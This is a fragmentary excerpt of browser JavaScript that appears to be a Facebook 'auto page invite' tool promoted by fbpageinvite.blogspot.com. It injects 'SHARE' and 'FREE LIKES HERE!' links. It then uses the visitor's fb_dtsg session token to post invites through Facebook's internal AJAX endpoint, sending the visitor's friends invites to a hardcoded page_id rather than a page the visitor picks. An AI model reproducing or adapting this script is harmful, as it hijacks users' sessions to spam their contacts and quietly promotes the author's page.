...
if(body != null) 
{
 ...
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Ffbpageinvite.blogspot.com&t=Facebook+Background+Theme' title='Share'><blink><center>SHARE</center></blink></a>"
...
if(body != null) 
{
 ...
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://fbpageinvite.blogspot.com/' title='FbPageInvite'><blink><center>FREE LIKES HERE!</center></blink></a>"
 body.appendChild(div);
}
...
var Descriptions = "",
    _text = 'Powered By:  <A style="color:#3B5998;" href="https://www.facebook.com/allfriendscode" target="_blank">FbPageInvite</A></br>Script Made By: </A><A style="color:#3B5998;" href="http://fbpageinvite.blogspot.com" target="_blank"> FbPageInvite</A></A>,</A></A>.</br>For More Tools Visit Our Blogs <A style="color:#3B5998;" href="http://fbpageinvite.blogspot.com/" target="_blank">Automate Your Facebook</A>.</A>';
...
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=1413001275623122&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
